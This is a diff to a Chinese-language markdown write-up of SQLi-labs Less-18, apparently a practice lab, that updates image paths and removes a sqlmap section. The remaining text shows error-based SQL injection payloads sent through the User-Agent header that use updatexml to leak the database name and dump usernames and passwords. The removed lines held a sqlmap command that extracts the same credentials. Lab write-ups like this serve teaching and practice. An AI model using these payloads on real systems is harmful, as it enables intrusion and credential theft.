@@ -17,14 +17,10 @@ print_r(mysql_error());
 **这关注入的前提是用户名和密码输入正确**
 用burp抓包
 修改User-Agent: 1' 报错
-![](assets/Less18/file-20260531174205449.png)
+![](assets/Less-18/file-20260531195755809.png)
 1' and updatexml(1,concat(0x7e,(database())),1) and '1'='1 #爆库名 
 ...
 1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1) and '1'='1 #爆数据 
-![](assets/Less18/file-20260531174631156.png)
+![](assets/Less-18/file-20260531195755808.png)
 
 ---
-sqlmap
-sqlmap -u "ip/Less-18/" --data="uname=Dumb&passwd=Dumb" --batch --level=3 --sql-query="select group_concat(username,0x3a,password) from security.users"
-![](assets/Less18/file-20260531180647799.png)
-
